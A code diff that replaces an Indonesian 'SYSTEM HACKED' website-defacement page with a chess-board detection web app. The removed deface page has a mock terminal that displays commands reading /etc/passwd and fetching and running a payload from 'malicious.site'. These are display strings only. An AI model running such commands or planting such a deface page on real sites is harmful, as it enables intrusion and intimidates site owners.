@@ -2,973 +2,593 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>DEFACE - Mobile Optimized</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#2c3e50">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%232c3e50'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%23f39c12'/%3E%3Ctext x='50' y='70' text-anchor='middle' fill='white' font-size='40' font-weight='bold'%3E♞%3C/text%3E%3C/svg%3E">
+    <title>Chess Master AI - Deteksi Papan Catur</title>
     <style>
-        /* Reset dan Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-text-size-adjust: 100%;
         }
-        
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow-x: hidden;
-            touch-action: manipulation;
-        }
-        
+
         body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', 'SF Mono', Monaco, monospace;
-            line-height: 1.4;
-            position: relative;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #1a472a 0%, #2e5a3a 50%, #1a472a 100%);
             min-height: 100vh;
-            background-image: 
-                linear-gradient(rgba(0, 30, 0, 0.2) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 30, 0, 0.2) 1px, transparent 1px);
-            background-size: 20px 20px;
-            background-attachment: fixed;
+            padding: 16px;
         }
-        
-        /* Matrix Rain untuk Mobile */
-        .matrix-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 1;
-            overflow: hidden;
-        }
-        
-        .matrix-char {
-            position: absolute;
-            color: #0f0;
-            font-size: 14px;
-            font-weight: bold;
-            opacity: 0.8;
-            text-shadow: 0 0 5px #0f0;
-            animation: fall linear infinite;
-            will-change: transform;
-            backface-visibility: hidden;
-        }
-        
-        @keyframes fall {
-            to {
-                transform: translateY(100vh);
-            }
-        }
-        
-        /* Kontainer Utama */
-        .main-container {
-            position: relative;
-            z-index: 2;
-            width: 100%;
-            max-width: 100%;
+
+        .container {
+            max-width: 800px;
             margin: 0 auto;
-            padding: 15px;
-            padding-bottom: 80px; /* Ruang untuk footer */
         }
-        
-        /* Header */
-        .hacked-header {
-            background: linear-gradient(90deg, #ff0000, #990000, #ff0000);
-            color: white;
-            padding: 12px 15px;
-            margin-bottom: 20px;
-            font-size: clamp(1.2rem, 4vw, 1.8rem);
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-align: center;
-            border: 2px solid white;
-            border-radius: 8px;
-            text-shadow: 0 0 8px white;
-            animation: blink 1s infinite;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
-            word-break: break-word;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
-        }
-        
-        /* Bagian Profil */
-        .profile-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(0, 20, 0, 0.7);
-            border-radius: 15px;
-            border: 1px solid #0f0;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
-        }
-        
-        /* Foto Bulat Responsif */
-        .circular-photo-container {
-            position: relative;
-            width: min(200px, 40vw);
-            height: min(200px, 40vw);
-            margin: 0 auto 15px;
-        }
-        
-        .circular-photo {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 3px solid #0f0;
-            box-shadow: 
-                0 0 20px #0f0,
-                inset 0 0 20px rgba(0, 255, 0, 0.3);
-            overflow: hidden;
-            background: #111;
-            animation: rotate 30s linear infinite paused;
-        }
-        
-        .circular-photo:hover,
-        .circular-photo:active {
-            animation-play-state: running;
-        }
-        
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .circular-photo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: sepia(100%) hue-rotate(90deg) contrast(120%);
-        }
-        
-        .hacker-name {
-            font-size: clamp(1.5rem, 5vw, 2rem);
-            color: #0f0;
-            text-shadow: 0 0 10px #0f0;
-            margin: 10px 0 5px;
-            text-align: center;
-            word-break: break-word;
-        }
-        
-        .hacker-tagline {
-            color: #ff0;
-            font-size: clamp(0.9rem, 3vw, 1.1rem);
-            text-align: center;
-            padding: 8px 15px;
-            border-bottom: 2px solid #f00;
-            display: inline-block;
-            margin-bottom: 15px;
-        }
-        
-        /* Pesan Deface */
-        .deface-message {
-            background: rgba(0, 30, 0, 0.85);
-            border: 2px solid #0f0;
-            border-radius: 10px;
+
+        /* Header Card */
+        .header-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
             padding: 20px;
-            margin: 20px 0;
-            box-shadow: 0 0 25px rgba(0, 255, 0, 0.4);
-            backdrop-filter: blur(5px);
-        }
-        
-        .deface-message h2 {
-            color: #f00;
-            font-size: clamp(1.2rem, 4vw, 1.6rem);
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
             text-align: center;
-            margin-bottom: 15px;
-            text-shadow: 0 0 5px #f00;
         }
-        
-        .message-text {
-            line-height: 1.6;
-            font-size: clamp(0.9rem, 3vw, 1rem);
-            color: #afc;
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
-        
-        .highlight {
-            color: #ff0;
+
+        .logo span {
+            font-size: 48px;
+        }
+
+        h1 {
+            color: #2c3e50;
+            font-size: 1.8em;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+        }
+
+        /* Tombol Pintasan */
+        .shortcut-section {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .section-title {
+            font-size: 1.2em;
             font-weight: bold;
-            background: rgba(255, 255, 0, 0.1);
-            padding: 0 3px;
-            border-radius: 3px;
-        }
-        
-        /* Grid Informasi Responsif */
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(min(250px, 100%), 1fr));
-            gap: 15px;
-            margin: 25px 0;
-        }
-        
-        .info-card {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #f00;
-            border-radius: 8px;
-            padding: 15px;
-            transition: all 0.3s ease;
-        }
-        
-        .info-card:active {
-            transform: scale(0.98);
-            background: rgba(255, 0, 0, 0.2);
-        }
-        
-        .info-card h3 {
-            color: #ff0;
-            font-size: clamp(1rem, 3.5vw, 1.2rem);
-            margin-bottom: 10px;
+            color: #2c3e50;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 8px;
         }
-        
-        .info-card p {
-            color: #afc;
-            font-size: clamp(0.85rem, 2.5vw, 0.95rem);
-            line-height: 1.5;
-            margin-bottom: 5px;
-        }
-        
-        /* Terminal Simulator */
-        .terminal-wrapper {
-            margin: 25px 0;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
-        }
-        
-        .terminal-header {
-            background: #333;
-            color: #0f0;
-            padding: 10px 15px;
-            font-size: clamp(0.9rem, 3vw, 1rem);
+
+        .btn-group {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .terminal-body {
-            background: #000;
-            height: min(250px, 40vh);
-            overflow-y: auto;
-            padding: 15px;
-            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
-            -webkit-overflow-scrolling: touch;
-        }
-        
-        .terminal-line {
-            margin-bottom: 8px;
-            opacity: 0;
-            animation: typeIn 0.5s forwards;
-            word-break: break-all;
-        }
-        
-        @keyframes typeIn {
-            to { opacity: 1; }
-        }
-        
-        .terminal-cursor {
-            display: inline-block;
-            width: 8px;
-            height: 16px;
-            background: #0f0;
-            animation: blink-cursor 1s infinite;
-            vertical-align: middle;
-        }
-        
-        @keyframes blink-cursor {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        
-        /* Countdown Mobile Friendly */
-        .countdown-container {
-            background: rgba(255, 0, 0, 0.15);
-            border: 2px solid #f00;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        
-        .countdown-title {
-            color: #ff0;
-            font-size: clamp(1rem, 3.5vw, 1.2rem);
-            margin-bottom: 10px;
-        }
-        
-        .countdown-timer {
-            font-size: clamp(1.8rem, 8vw, 2.5rem);
-            color: #f00;
-            text-shadow: 0 0 10px #f00;
-            font-weight: bold;
-            font-family: 'Digital-7', monospace;
-            animation: pulse-red 1s infinite;
-        }
-        
-        @keyframes pulse-red {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        /* Footer Mobile */
-        .mobile-footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(0, 20, 0, 0.95);
-            border-top: 2px solid #0f0;
-            padding: 12px 15px;
-            text-align: center;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-        }
-        
-        .footer-text {
-            color: #8f8;
-            font-size: clamp(0.7rem, 2.5vw, 0.85rem);
-            line-height: 1.4;
-        }
-        
-        /* Touch Controls */
-        .touch-controls {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 20px 0;
+            gap: 12px;
             flex-wrap: wrap;
         }
-        
-        .touch-btn {
-            background: rgba(0, 255, 0, 0.1);
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: clamp(0.9rem, 3vw, 1rem);
+
+        .btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            user-select: none;
-            transition: all 0.2s;
-            touch-action: manipulation;
-            min-width: 120px;
-            text-align: center;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: inherit;
         }
-        
-        .touch-btn:active {
-            background: rgba(0, 255, 0, 0.3);
-            transform: scale(0.95);
+
+        .btn-primary {
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+            color: white;
+            box-shadow: 0 4px 12px rgba(243,156,18,0.3);
         }
-        
-        /* Glitch Effect untuk Mobile */
-        .glitch {
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+        }
+
+        .btn-install {
+            background: linear-gradient(135deg, #27ae60, #229954);
+            color: white;
+        }
+
+        /* Kamera Section */
+        .camera-section {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .video-container {
             position: relative;
-        }
-        
-        .glitch::before,
-        .glitch::after {
-            content: attr(data-text);
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
+            border-radius: 16px;
             overflow: hidden;
-        }
-        
-        .glitch::before {
-            left: 1px;
-            text-shadow: -1px 0 #ff00ff;
-            animation: glitch-1-mobile 2s infinite linear alternate-reverse;
-        }
-        
-        .glitch::after {
-            left: -1px;
-            text-shadow: 1px 0 #00ffff;
-            animation: glitch-2-mobile 3s infinite linear alternate-reverse;
-        }
-        
-        @keyframes glitch-1-mobile {
-            0% { clip-path: inset(30% 0 61% 0); }
-            100% { clip-path: inset(80% 0 1% 0); }
-        }
-        
-        @keyframes glitch-2-mobile {
-            0% { clip-path: inset(15% 0 58% 0); }
-            100% { clip-path: inset(70% 0 5% 0); }
-        }
-        
-        /* Loading untuk Mobile */
-        .mobile-loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
             background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            transition: opacity 0.5s;
+            margin-bottom: 15px;
         }
-        
-        .loading-text {
-            color: #0f0;
-            font-size: clamp(1rem, 4vw, 1.5rem);
-            margin-top: 20px;
+
+        #video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .canvas-container {
+            display: none;
+        }
+
+        .controls {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+
+        .btn-camera {
+            background: #34495e;
+            color: white;
+            flex: 1;
+        }
+
+        .btn-capture {
+            background: #e74c3c;
+            color: white;
+        }
+
+        /* Hasil Deteksi */
+        .result-section {
+            background: rgba(255,255,255,0.95);
+            border-radius: 24px;
+            padding: 20px;
+        }
+
+        .board-state {
+            background: #ecf0f1;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 15px;
+            font-family: monospace;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+
+        .best-move {
+            background: linear-gradient(135deg, #27ae60, #229954);
+            color: white;
+            padding: 15px;
+            border-radius: 16px;
             text-align: center;
         }
-        
-        /* Swipe Indicator */
-        .swipe-indicator {
-            position: fixed;
-            bottom: 100px;
-            right: 20px;
-            background: rgba(0, 255, 0, 0.2);
-            border: 1px solid #0f0;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            animation: bounce 2s infinite;
-            z-index: 50;
-            display: none;
+
+        .best-move h3 {
+            margin-bottom: 10px;
         }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+
+        .move-text {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 2px;
         }
-        
-        /* Media Queries */
-        @media (max-width: 480px) {
-            .main-container {
-                padding: 10px;
-                padding-bottom: 70px;
-            }
-            
-            .hacked-header {
-                padding: 10px;
-                font-size: 1.1rem;
-                letter-spacing: 2px;
-            }
-            
-            .circular-photo-container {
-                width: 150px;
-                height: 150px;
-            }
-            
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .terminal-body {
-                height: 200px;
-            }
-        }
-        
-        @media (min-width: 768px) {
-            .main-container {
-                padding: 20px;
-                max-width: 90%;
-            }
-            
-            .hacked-header {
-                font-size: 2rem;
-            }
-        }
-        
-        @media (min-width: 1024px) {
-            .main-container {
-                max-width: 1000px;
-            }
-        }
-        
-        /* Orientation Warning */
-        .orientation-warning {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            color: #ff0;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+
+        .loading {
             text-align: center;
             padding: 20px;
-            z-index: 2000;
+            color: #7f8c8d;
         }
-        
-        @media (max-height: 500px) and (orientation: landscape) {
-            .orientation-warning {
-                display: flex;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .detecting {
+            animation: pulse 1s infinite;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+            
+            .btn {
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+            
+            .move-text {
+                font-size: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Loading Screen untuk Mobile -->
-    <div class="mobile-loading" id="loadingScreen">
-        <div class="circular-photo" style="width: 100px; height: 100px; animation: rotate 2s linear infinite;">
-            <div style="width: 100%; height: 100%; background: #0f0; opacity: 0.5; border-radius: 50%;"></div>
+    <div class="container">
+        <!-- Header dengan Logo -->
+        <div class="header-card">
+            <div class="logo">
+                <span>♞</span>
+            </div>
+            <h1>Chess Master AI</h1>
+            <p class="subtitle">Deteksi Papan Catur & Langkah Terbaik</p>
         </div>
-        <div class="loading-text">MEMUAT SISTEM HACKED...</div>
-    </div>
-    
-    <!-- Matrix Rain Effect Optimized -->
-    <div class="matrix-container" id="matrixContainer"></div>
-    
-    <!-- Orientation Warning -->
-    <div class="orientation-warning">
-        <i class="fas fa-rotate-right" style="font-size: 3rem; margin-bottom: 20px;"></i>
-        <h2>PUTAR PERANGKAT ANDA</h2>
-        <p>Untuk pengalaman terbaik, gunakan mode portrait</p>
-    </div>
-    
-    <!-- Swipe Indicator -->
-    <div class="swipe-indicator" id="swipeIndicator">
-        <i class="fas fa-arrow-up"></i>
-    </div>
-    
-    <!-- Konten Utama -->
-    <div class="main-container">
-        <!-- Header -->
-        <div class="hacked-header glitch" data-text="SYSTEM HACKED">
-            SYSTEM HACKED
+
+        <!-- Section Pintasan ke Layar Beranda -->
+        <div class="shortcut-section">
+            <div class="section-title">
+                <span>📱</span>
+                <span>Tambahkan ke Layar Beranda</span>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-install" id="installBtn">
+                    <span>⬇️</span> Aktifkan Pintasan
+                </button>
+                <button class="btn btn-primary" id="addToHomeBtn">
+                    <span>➕</span> Tambah ke Layar Beranda
+                </button>
+            </div>
+            <p style="font-size: 12px; color: #7f8c8d; margin-top: 12px; text-align: center;">
+                💡 Petunjuk: Klik "Aktifkan Pintasan" lalu pilih "Tambahkan ke Layar Beranda" untuk membuat shortcut dengan logo catur
+            </p>
         </div>
-        
-        <!-- Profile dengan Foto Bulat -->
-        <div class="profile-section">
-            <div class="circular-photo-container">
-                <div class="circular-photo" id="profilePhoto">
-                    <!-- Ganti dengan foto Anda -->
-                    <img src="https://files.catbox.moe/pzgkyp.png" 
-                         alt="Hacker Profile"
-                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNpcmNsZSBjeD0iMTAwIiBjeT0iMTAwIiByPSI5OCIgZmlsbD0iIzAwMDAwMCIgc3Ryb2tlPSIjMDBGRjAwIiBzdHJva2Utd2lkdGg9IjQiLz48cGF0aCBkPSJNMTMwIDExMEMxMzAgMTI0LjkyOSAxMTkuOTI5IDEzNSAxMDUgMTM1QzkwLjA3MSAxMzUgODAgMTI0LjkyOSA4MCAxMTBDODAgOTUuMDcxIDkwLjA3MSA4NSAxMDUgODVDMTE5LjkyOSA4NSAxMzAgOTUuMDcxIDEzMCAxMTBaIiBmaWxsPSIjMDBGRjAwIi8+PGNpcmNsZSBjeD0iMTA1IiBjeT0iODUiIHI9IjEwIiBmaWxsPSIjMDBGRjAwIi8+PHBhdGggZD0iTTg1IDE1MEwxMjUgMTUwTTk1IDE1MEwxMTUgMTUwTTEwNSAxNTVMMTA1IDE3MCIgc3Ryb2tlPSIjMDBGRjAwIiBzdHJva2Utd2lkdGg9IjgiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPjwvc3ZnPg=='">
+
+        <!-- Kamera Section -->
+        <div class="camera-section">
+            <div class="section-title">
+                <span>📷</span>
+                <span>Deteksi Papan Catur</span>
+            </div>
+            <div class="video-container">
+                <video id="video" autoplay playsinline muted></video>
+                <canvas id="canvas" style="display: none;"></canvas>
+            </div>
+            <div class="controls">
+                <button class="btn btn-camera" id="startCameraBtn">📷 Mulai Kamera</button>
+                <button class="btn btn-camera" id="stopCameraBtn" disabled>⏹️ Hentikan</button>
+                <button class="btn btn-capture" id="captureBtn" disabled>🎯 Deteksi Papan</button>
+            </div>
+        </div>
+
+        <!-- Hasil Deteksi -->
+        <div class="result-section" id="resultSection">
+            <div class="section-title">
+                <span>🎯</span>
+                <span>Hasil Analisis</span>
+            </div>
+            <div id="resultContent">
+                <div class="loading">
+                    Mulai kamera dan ambil gambar papan catur untuk mendapatkan langkah terbaik
                 </div>
             </div>
-            
-            <div class="hacker-name">CYBER_PHOENIX</div>
-            <div class="hacker-tagline">TIDAK ADA SYSTEM YANG AMAN</div>
-        </div>
-        
-        <!-- Countdown Timer -->
-        <div class="countdown-container">
-            <div class="countdown-title">SYSTEM DESTRUCTION IN:</div>
-            <div class="countdown-timer" id="countdownTimer">05:00</div>
-        </div>
-        
-        <!-- Touch Controls -->
-        <div class="touch-controls">
-            <div class="touch-btn" onclick="toggleMatrix()">
-                <i class="fas fa-matrix"></i> TOGGLE MATRIX
-            </div>
-            <div class="touch-btn" onclick="resetCountdown()">
-                <i class="fas fa-redo"></i> RESET TIMER
-            </div>
-            <div class="touch-btn" onclick="showTerminal()">
-                <i class="fas fa-terminal"></i> SHOW TERMINAL
-            </div>
-        </div>
-        
-        <!-- Deface Message -->
-        <div class="deface-message">
-            <h2>⚠️ SYSTEM BREACH DETECTED ⚠️</h2>
-            <div class="message-text">
-                <p>Your security systems have been <span class="highlight">COMPROMISED</span>.</p>
-                <p>All firewalls bypassed. Encryption keys obtained. Administrative privileges seized.</p>
-                <p>This is a demonstration of security vulnerability. Your data remains untouched.</p>
-                <p><span class="highlight">Message:</span> No system is impenetrable. This is a wake-up call.</p>
-                <p style="margin-top: 15px; font-size: 0.9em; color: #8f8;">
-                    <i class="fas fa-mobile-alt"></i> Halaman ini dioptimalkan untuk semua perangkat
-                </p>
-            </div>
-        </div>
-        
-        <!-- Info Grid -->
-        <div class="info-grid">
-            <div class="info-card">
-                <h3><i class="fas fa-database"></i> DATA ACCESSED</h3>
-                <p>• User Database</p>
-                <p>• Configuration Files</p>
-                <p>• Security Logs</p>
-                <p>• Encryption Keys</p>
-            </div>
-            
-            <div class="info-card">
-                <h3><i class="fas fa-shield-alt"></i> SECURITY BREACHES</h3>
-                <p>• Firewall Bypassed</p>
-                <p>• IDS Evaded</p>
-                <p>• SQL Injection</p>
-                <p>• XSS Exploit</p>
-            </div>
-            
-            <div class="info-card">
-                <h3><i class="fas fa-bullseye"></i> TARGET INFORMATION</h3>
-                <p>• IP: 192.168.1.***</p>
-                <p>• Ports: 22, 80, 443</p>
-                <p>• OS: Linux 5.15.0</p>
-                <p>• Vulnerabilities: 12</p>
-            </div>
-        </div>
-        
-        <!-- Terminal Simulator -->
-        <div class="terminal-wrapper" id="terminalWrapper">
-            <div class="terminal-header">
-                <span>root@hacked-system:~</span>
-                <span><i class="fas fa-times" onclick="hideTerminal()" style="cursor:pointer;"></i></span>
-            </div>
-            <div class="terminal-body" id="terminalBody">
-                <!-- Terminal lines akan diisi oleh JavaScript -->
-            </div>
         </div>
     </div>
-    
-    <!-- Footer Mobile -->
-    <div class="mobile-footer">
-        <div class="footer-text">
-            <i class="fas fa-exclamation-triangle"></i> Educational Purpose Only | 
-            <span id="deviceInfo">Loading device info...</span>
-        </div>
-    </div>
-    
+
     <script>
-        // Deteksi perangkat dan inisialisasi
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        // DOM Elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startCameraBtn = document.getElementById('startCameraBtn');
+        const stopCameraBtn = document.getElementById('stopCameraBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const installBtn = document.getElementById('installBtn');
+        const addToHomeBtn = document.getElementById('addToHomeBtn');
+        const resultContent = document.getElementById('resultContent');
+
+        let stream = null;
+        let isCameraActive = false;
+
+        // ============ FITUR PINTASAN KE LAYAR BERANDA ============
         
-        // Variabel global
-        let matrixInterval;
-        let countdownInterval;
-        let countdownTime = 5 * 60; // 5 menit
-        let matrixActive = true;
+        // Cek apakah PWA sudah terinstall
+        let deferredPrompt;
         
-        // Inisialisasi saat halaman dimuat
-        document.addEventListener('DOMContentLoaded', function() {
-            // Sembunyikan loading screen
-            setTimeout(() => {
-                document.getElementById('loadingScreen').style.opacity = '0';
-                setTimeout(() => {
-                    document.getElementById('loadingScreen').style.display = 'none';
-                }, 500);
-            }, 1500);
-            
-            // Setup untuk perangkat mobile
-            if (isMobile || isTouchDevice) {
-                setupMobileFeatures();
-            }
-            
-            // Inisialisasi komponen
-            initMatrixRain();
-            startCountdown();
-            initTerminal();
-            updateDeviceInfo();
-            
-            // Setup event listeners untuk touch/click
-            setupEventListeners();
-            
-            // Prevent zoom on double tap
-            document.addEventListener('dblclick', function(e) {
-                e.preventDefault();
-            }, { passive: false });
-            
-            // Handle orientation change
-            window.addEventListener('orientationchange', function() {
-                setTimeout(initMatrixRain, 300);
-            });
-            
-            // Show swipe indicator on mobile
-            if (isMobile) {
-                setTimeout(() => {
-                    document.getElementById('swipeIndicator').style.display = 'flex';
-                    setTimeout(() => {
-                        document.getElementById('swipeIndicator').style.display = 'none';
-                    }, 5000);
-                }, 3000);
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            installBtn.style.display = 'flex';
+        });
+        
+        installBtn.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    console.log('PWA installed');
+                }
+                deferredPrompt = null;
             }
         });
         
-        // Setup untuk fitur mobile
-        function setupMobileFeatures() {
-            // Optimalkan untuk touch
-            document.body.classList.add('touch-device');
+        // Fungsi untuk menambahkan ke layar beranda (manual)
+        addToHomeBtn.addEventListener('click', () => {
+            // Buat instruksi berdasarkan perangkat
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
+            const isAndroid = /Android/.test(navigator.userAgent);
             
-            // Setup swipe gestures
-            let startY;
-            document.addEventListener('touchstart', function(e) {
-                startY = e.touches[0].clientY;
-            });
-            
-            document.addEventListener('touchmove', function(e) {
-                if (!startY) return;
-                
-                const currentY = e.touches[0].clientY;
-                const diff = startY - currentY;
-                
-                // Scroll ke atas
-                if (diff > 50) {
-                    document.getElementById('swipeIndicator').style.display = 'none';
-                }
-            });
-        }
-        
-        // Matrix Rain Effect Optimized untuk Mobile
-        function initMatrixRain() {
-            const container = document.getElementById('matrixContainer');
-            container.innerHTML = '';
-            
-            const chars = "01";
-            const charArray = chars.split("");
-            const containerWidth = window.innerWidth;
-            const containerHeight = window.innerHeight;
-            
-            // Sesuaikan jumlah karakter berdasarkan ukuran layar
-            const charCount = isMobile ? 
-                Math.floor(containerWidth / 15) * 3 : 
-                Math.floor(containerWidth / 12) * 5;
-            
-            for (let i = 0; i < charCount; i++) {
-                const char = document.createElement('div');
-                char.className = 'matrix-char';
-                char.textContent = charArray[Math.floor(Math.random() * charArray.length)];
-                
-                // Posisi acak
-                char.style.left = Math.random() * 100 + 'vw';
-                char.style.top = Math.random() * -100 + 'px';
-                
-                // Warna hijau dengan variasi
-                const greenValue = 120 + Math.floor(Math.random() * 100);
-                char.style.color = `rgb(0, ${greenValue}, 0)`;
-                
-                // Kecepatan jatuh bervariasi
-                const duration = 2 + Math.random() * 5;
-                char.style.animationDuration = duration + 's';
-                
-                // Delay awal acak
-                char.style.animationDelay = Math.random() * 5 + 's';
-                
-                container.appendChild(char);
-            }
-        }
-        
-        // Countdown Timer
-        function startCountdown() {
-            updateCountdownDisplay();
-            
-            countdownInterval = setInterval(() => {
-                if (countdownTime > 0) {
-                    countdownTime--;
-                    updateCountdownDisplay();
-                    
-                    // Efek khusus saat waktu hampir habis
-                    if (countdownTime <= 60) {
-                        document.getElementById('countdownTimer').style.animationDuration = '0.5s';
-                        if (countdownTime <= 10) {
-                            document.getElementById('countdownTimer').style.color = '#ff0000';
-                            document.getElementById('countdownTimer').style.fontSize = 'clamp(2rem, 9vw, 3rem)';
-                        }
-                    }
-                } else {
-                    clearInterval(countdownInterval);
-                    document.getElementById('countdownTimer').textContent = "SYSTEM DESTROYED";
-                    triggerGlitchEffect();
-                }
-            }, 1000);
-        }
-        
-        function updateCountdownDisplay() {
-            const minutes = Math.floor(countdownTime / 60);
-            const seconds = countdownTime % 60;
-            document.getElementById('countdownTimer').textContent = 
-                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        function resetCountdown() {
-            clearInterval(countdownInterval);
-            countdownTime = 5 * 60;
-            document.getElementById('countdownTimer').style.color = '#f00';
-            document.getElementById('countdownTimer').style.fontSize = 'clamp(1.8rem, 8vw, 2.5rem)';
-            document.getElementById('countdownTimer').style.animationDuration = '1s';
-            startCountdown();
-        }
-        
-        // Terminal Simulator
-        function initTerminal() {
-            const terminalBody = document.getElementById('terminalBody');
-            terminalBody.innerHTML = '';
-            
-            const terminalLines = [
-                "[root@system]# ssh admin@target_system",
-                "Password: ***********",
-                "Access granted. Welcome, root.",
-                "[root@target]# cat /etc/passwd",
-                "root:x:0:0:root:/root:/bin/bash",
-                "admin:x:1000:1000:Admin User:/home/admin:/bin/bash",
-                "[root@target]# rm -rf /tmp/backdoor",
-                "[root@target]# wget http://malicious.site/payload.sh",
-                "[root@target]# chmod +x payload.sh",
-                "[root@target]# ./payload.sh",
-                "System compromised. Cleaning logs...",
-                "[root@target]# exit",
-                "Connection closed.",
-                "[root@system]# <span class='terminal-cursor'></span>"
-            ];
-            
-            // Animasikan setiap baris dengan delay
-            terminalLines.forEach((line, index) => {
-                setTimeout(() => {
-                    const lineElement = document.createElement('div');
